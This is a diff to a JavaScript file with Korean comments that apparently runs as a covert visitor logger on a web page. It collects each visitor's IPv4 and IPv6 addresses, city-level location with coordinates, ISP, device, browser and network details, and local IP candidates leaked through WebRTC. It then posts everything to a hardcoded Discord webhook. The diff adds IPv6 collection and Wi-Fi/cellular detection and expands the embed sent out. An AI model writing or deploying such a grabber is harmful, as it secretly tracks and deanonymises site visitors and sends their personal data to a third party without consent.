@@ -2,6 +2,8 @@ const WEBHOOK_URL = 'https://discord.com/api/webhooks/1448558533397446696/eaX0Rd
 
 let visitorInfo = {};
 
+/* ========== 기본 정보 수집 ========== */
+
 function getDeviceInfo() {
     return {
         platform: navigator.platform,
@@ -33,20 +35,39 @@ function getScreenInfo() {
 
 function getNetworkInfo() {
     const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    if (connection) {
-        return {
-            effectiveType: connection.effectiveType || 'N/A',
-            downlink: connection.downlink ? `${connection.downlink} Mbps` : 'N/A',
-            rtt: connection.rtt ? `${connection.rtt}ms` : 'N/A',
-            saveData: connection.saveData ? '활성화' : '비활성화'
-        };
-    }
-    return {
+
+    const base = {
         effectiveType: 'N/A',
         downlink: 'N/A',
         rtt: 'N/A',
-        saveData: 'N/A'
+        saveData: 'N/A',
+        type: 'N/A',
+        networkCategory: 'N/A' // Wi-Fi / Cellular / Unknown
     };
+
+    if (!connection) return base;
+
+    const info = { ...base };
+
+    info.effectiveType = connection.effectiveType || 'N/A';
+    info.downlink = connection.downlink ? `${connection.downlink} Mbps` : 'N/A';
+    info.rtt = connection.rtt ? `${connection.rtt}ms` : 'N/A';
+    info.saveData = connection.saveData ? '활성화' : '비활성화';
+    info.type = connection.type || 'N/A';
+
+    // Wi-Fi / 데이터(셀룰러) 추정
+    const t = (connection.type || '').toLowerCase();
+    if (t === 'wifi') {
+        info.networkCategory = 'Wi-Fi';
+    } else if (t === 'cellular' || t === 'wimax') {
+        info.networkCategory = 'Cellular';
+    } else if (['slow-2g', '2g', '3g', '4g'].includes((connection.effectiveType || '').toLowerCase())) {
+        info.networkCategory = 'Cellular(추정)';
+    } else {
+        info.networkCategory = 'Unknown';
+    }
+
+    return info;
 }
 
 function getBrowserInfo() {
@@ -78,7 +99,7 @@ function getOSInfo() {
     if (ua.indexOf('Windows NT 10.0') > -1) osName = 'Windows 10/11';
     else if (ua.indexOf('Windows NT 6.3') > -1) osName = 'Windows 8.1';
     else if (ua.indexOf('Windows NT 6.2') > -1) osName = 'Windows 8';
-    else if (ua.indexIndexOf('Windows NT 6.1') > -1) osName = 'Windows 7';
+    else if (ua.indexOf('Windows NT 6.1') > -1) osName = 'Windows 7';
     else if (ua.indexOf('Mac OS X') > -1) osName = 'macOS';
     else if (ua.indexOf('Linux') > -1) osName = 'Linux';
     else if (ua.indexOf('Android') > -1) osName = 'Android';
@@ -289,9 +310,49 @@ function getPerformanceInfo() {
 }
 
 
-/* ============================================================
-      📌 WebRTC STUN 기반 IP 후보 탐지 (멀티 STUN 서버)
-============================================================ */
+/* ========== IP 정보 수집 (IPv4 / IPv6 구분) ========== */
+
+async function getIPInfo() {
+    const info = {
+        ipv4: null,
+        ipv6: null,
+        primary: null,
+        ipVersion: 'Unknown'
+    };
+
+    // IPv4 전용
+    try {
+        const res4 = await fetch('https://api.ipify.org?format=json');
+        const data4 = await res4.json();
+        if (data4 && data4.ip && !data4.ip.includes(':')) {
+            info.ipv4 = data4.ip;
+        }
+    } catch {}
+
+    // IPv6(+fallback) 전용
+    try {
+        const res6 = await fetch('https://api64.ipify.org?format=json');
+        const data6 = await res6.json();
+        if (data6 && data6.ip) {
+            if (data6.ip.includes(':')) {
+                info.ipv6 = data6.ip;
+            } else if (!info.ipv4) {
+                info.ipv4 = data6.ip;
+            }
+        }
+    } catch {}
+
+    info.primary = info.ipv6 || info.ipv4;
+    if (info.primary) {
+        info.ipVersion = info.primary.includes(':') ? 'IPv6' : 'IPv4';
+    }
+
+    return info;
+}
+
+
+/* ========== WebRTC STUN 기반 IP 후보 탐지 ========== */
+
 async function getWebRTCIPs() {
     return new Promise((resolve) => {
         const ips = {
@@ -349,38 +410,42 @@ async function getWebRTCIPs() {
 }
 
 
-/* ============================================================
-      📌 메인 실행: 모든 정보 수집 + 웹훅 전송
-============================================================ */
+/* ========== 메인: 수집 후 웹훅 전송 ========== */
+
 async function collectAndSendInfo() {
     try {
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        visitorInfo.ip = ipData.ip;
+        // IP 정보 (IPv4 / IPv6)
+        const ipInfo = await getIPInfo();
+        visitorInfo.ipInfo = ipInfo;
+        visitorInfo.ip = ipInfo.primary;
+        visitorInfo.ipVersion = ipInfo.ipVersion;
 
-        try {
-            const locationResponse = await fetch(`http://ip-api.com/json/${ipData.ip}`);
-            const locationData = await locationResponse.json();
+        // 위치 정보 (ip-api) - primary IP 기준
+        if (visitorInfo.ip) {
+            try {
+                const locationResponse = await fetch(`http://ip-api.com/json/${visitorInfo.ip}`);
+                const locationData = await locationResponse.json();
 
-            if (locationData.status === 'success') {
-                visitorInfo.location = {
-                    country: locationData.country,
-                    countryCode: locationData.countryCode,
-                    region: locationData.regionName,
-                    city: locationData.city,
-                    isp: locationData.isp,
-                    org: locationData.org,
-                    timezone: locationData.timezone,
-                    lat: locationData.lat,
-                    lon: locationData.lon
-                };
-            }
-        } catch {}
+                if (locationData.status === 'success') {
+                    visitorInfo.location = {
+                        country: locationData.country,
+                        countryCode: locationData.countryCode,
+                        region: locationData.regionName,
+                        city: locationData.city,
+                        isp: locationData.isp,
+                        org: locationData.org,
+                        timezone: locationData.timezone,
+                        lat: locationData.lat,
+                        lon: locationData.lon
+                    };
+                }
+            } catch {}
+        }
 
         const now = new Date();
         visitorInfo.timestamp = now.toISOString();
         visitorInfo.localTime = now.toLocaleString('ko-KR');
-        visitorInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        visitorInfo.timezoneString = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
         visitorInfo.device = getDeviceInfo();
         visitorInfo.browser = getBrowserInfo();
@@ -401,7 +466,7 @@ async function collectAndSendInfo() {
         visitorInfo.url = window.location.href;
         visitorInfo.referrer = document.referrer || '직접 접속';
 
-        /* 📌 WebRTC 결과 추가 */
+        // WebRTC IP 후보 정보
         visitorInfo.webRTC = await getWebRTCIPs();
 
         const embed = {
@@ -415,13 +480,35 @@ async function collectAndSendInfo() {
             fields: [
                 {
                     name: "기본 정보",
-                    value: `**IP 주소:** ${visitorInfo.ip}\n**ISP:** ${visitorInfo.location?.isp || 'N/A'}\n**조직:** ${visitorInfo.location?.org || 'N/A'}\n**접속 시간:** ${visitorInfo.localTime}`,
-                    inline: true
+                    value:
+                        `**주 IP:** ${visitorInfo.ip || 'N/A'} (${visitorInfo.ipVersion || 'Unknown'})\n` +
+                        `**IPv4:** ${visitorInfo.ipInfo?.ipv4 || 'N/A'}\n` +
+                        `**IPv6:** ${visitorInfo.ipInfo?.ipv6 || 'N/A'}\n` +
+                        `**ISP:** ${visitorInfo.location?.isp || 'N/A'}\n` +
+                        `**조직:** ${visitorInfo.location?.org || 'N/A'}\n` +
+                        `**접속 시간:** ${visitorInfo.localTime}`,
+                    inline: false
                 },
                 {
                     name: "위치 정보",
-                    value: `**국가:** ${visitorInfo.location?.country || 'N/A'} (${visitorInfo.location?.countryCode || 'N/A'})\n**지역:** ${visitorInfo.location?.region || 'N/A'}\n**도시:** ${visitorInfo.location?.city || 'N/A'}\n**좌표:** ${visitorInfo.location?.lat || 'N/A'}, ${visitorInfo.location?.lon || 'N/A'}\n**시간대:** ${visitorInfo.timezoneInfo.timezone}`,
-                    inline: true
+                    value:
+                        `**국가:** ${visitorInfo.location?.country || 'N/A'} (${visitorInfo.location?.countryCode || 'N/A'})\n` +
+                        `**지역:** ${visitorInfo.location?.region || 'N/A'}\n` +
+                        `**도시:** ${visitorInfo.location?.city || 'N/A'}\n` +
+                        `**좌표:** ${visitorInfo.location?.lat || 'N/A'}, ${visitorInfo.location?.lon || 'N/A'}\n` +
+                        `**시간대:** ${visitorInfo.timezoneInfo.timezone}`,
+                    inline: false
+                },
+                {
+                    name: "네트워크 정보",
+                    value:
+                        `**네트워크 타입:** ${visitorInfo.network.networkCategory || 'N/A'}\n` +
+                        `**원시 type:** ${visitorInfo.network.type || 'N/A'}\n` +
+                        `**effectiveType:** ${visitorInfo.network.effectiveType}\n` +
+                        `**다운링크:** ${visitorInfo.network.downlink}\n` +
+                        `**RTT:** ${visitorInfo.network.rtt}\n` +
+                        `**데이터 세이브:** ${visitorInfo.network.saveData}`,
+                    inline: false
                 },
                 {
                     name: "WebRTC IP 후보",
